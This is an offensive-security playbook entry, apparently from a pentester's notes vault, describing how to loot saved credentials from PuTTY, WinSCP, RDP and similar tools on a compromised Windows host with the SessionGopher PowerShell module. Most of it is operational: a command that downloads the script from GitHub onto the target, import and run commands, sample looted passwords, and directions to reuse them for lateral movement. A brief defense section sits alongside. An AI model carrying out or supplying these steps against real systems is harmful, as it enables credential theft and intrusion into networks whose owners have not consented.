---
id: b6c4a146-0b20-43f4-a79d-a6759a96ef4a
name: Windows-Privilege-Escalation-EoP-Looting-for-Passwords-with-SessionGopher
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.230393+00:00'
updated_at: '2023-04-10T20:37:49.215200+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/EoP - Looting for passwords]]'
  - '[[tags/Passwords stored in services]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/powershell-download-sessiongopher]]'
  - '[[commands/powershell-import-sessiongopher-module]]'
  - '[[commands/invoke-sessiongopher-all-domains]]'
  - '[[commands/invoke-sessiongopher-with-credentials]]'
platforms:
  - Windows
tools:
  - '[[tools/SessionGopher]]'
validated: true
---

# Windows-Privilege-Escalation-EoP-Looting-for-Passwords-with-SessionGopher

## Summary

This procedure uses the SessionGopher PowerShell script to enumerate and extract saved credentials from remote access tools like PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP on a compromised Windows system. It enables privilege escalation by looting passwords stored in memory or configuration files, allowing attackers to access other systems or elevate privileges using stolen credentials.

## Description

SessionGopher is a specialized PowerShell module designed for post-exploitation activities on Windows environments. It targets session information and plaintext passwords saved by various remote access applications, which are often overlooked in standard credential dumping. By leveraging Windows APIs and parsing application-specific storage (e.g., registry keys for PuTTY, XML files for WinSCP), SessionGopher collects usable credentials without requiring admin rights in many cases, though elevated privileges improve success rates. This technique is particularly effective in domain environments where users save sessions for convenience, leading to lateral movement opportunities. The procedure assumes initial foothold access and focuses on extracting credentials for further escalation, such as using them to access domain controllers or other high-value targets.

## Requirements

1. Access to a Windows system via an initial foothold (e.g., shell or RDP session).
2. PowerShell 2.0 or later installed (standard on Windows 7+).
3. Local user context; administrative privileges recommended for full enumeration but not always required.
4. Internet access on the target for downloading the script (or transfer via other means like SMB).
5. Tools: SessionGopher script (downloaded during execution).

## Defense

- Regularly monitor PowerShell execution logs (Event ID 4104) for suspicious module imports and script downloads.
- Implement application whitelisting (e.g., AppLocker) to restrict unsigned PowerShell scripts.
- Educate users not to save passwords in remote access tools; enforce group policies to disable credential storage.
- Use endpoint detection tools to scan for known credential dumping behaviors and anomalous network connections to GitHub raw content.
- Enable Credential Guard on Windows 10+ to protect LSASS and related memory structures.

## Objectives

1. Download and load the SessionGopher module on the target system.
2. Enumerate saved sessions and extract plaintext credentials from remote access tools.
3. Output results to a file for offline analysis and use in privilege escalation.
4. Identify opportunities for lateral movement using stolen credentials.

## Instructions

### Step 1: Download the SessionGopher Script

**Context**: Retrieve the SessionGopher PowerShell module from its public repository to prepare for execution. This step uses PowerShell's built-in web request capabilities to fetch the script directly.

**Command** ([[commands/powershell-download-sessiongopher]]):
```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" -OutFile "SessionGopher.ps1"
```

> This downloads the script to the current directory. Verify the file size (~50KB) and integrity by checking the hash if possible. Expected output: A success message like "StatusCode: 200" and the file created.

### Step 2: Import the SessionGopher Module

**Context**: Load the downloaded script as a PowerShell module to make its functions available for invocation. This enables the core enumeration capabilities.

**Command** ([[commands/powershell-import-sessiongopher-module]]):
```powershell
Import-Module .\SessionGopher.ps1
```

> Run this in the directory containing the script. If successful, no errors occur, and functions like Invoke-SessionGopher become available via Get-Command. Expected output: Silent success or module loading confirmation.

### Step 3: Invoke SessionGopher for All Domains

**Context**: Run the enumeration across all accessible domains to extract session data and passwords, outputting to a file for review. Use this for broad discovery without specific credentials.

**Command** ([[commands/invoke-sessiongopher-all-domains]]):
```powershell
Invoke-SessionGopher -AllDomain -o SessionGopher-Output.xml
```

> The -AllDomain flag targets sessions from all domains, while -o specifies the output file in XML format for easy parsing. Expected output: An XML file listing tools, hostnames, usernames, and passwords (e.g., <RDP><ComputerName>DC01</ComputerName><UserName>admin</UserName><Password>pass123</Password></RDP>).

### Step 4: Invoke SessionGopher with Specific Credentials (Optional)

**Context**: If domain authentication is needed for deeper enumeration, provide credentials to access restricted sessions. This is useful if initial runs fail due to access issues.

**Command** ([[commands/invoke-sessiongopher-with-credentials]]):
```powershell
Invoke-SessionGopher -AllDomain -u "domain.com\adm-arvanaghi" -p "s3cr3tP@ss" -o SessionGopher-Auth.xml
```

> Substitute actual domain credentials. Expected output: Enhanced XML results including authenticated sessions. If credentials are invalid, errors like "Access Denied" appear; otherwise, additional entries in the output file.

### Step 5: Review and Utilize Output

**Context**: Parse the generated XML file to identify viable credentials for escalation. Manually review or use tools like xmlstarlet for automation.

**Instructions**: Open the output file (e.g., SessionGopher-Output.xml) in a text editor or PowerShell. Look for sections like PuTTY, WinSCP, etc., and test extracted credentials against targets (e.g., via RDP or SSH clients). If passwords are found, use them for lateral movement procedures like [[procedures/Windows-Lateral-Movement-with-RDP]].

> Expected output: Actionable credentials, such as RDP connections to elevated hosts. Success is confirmed by successful logins using looted creds.
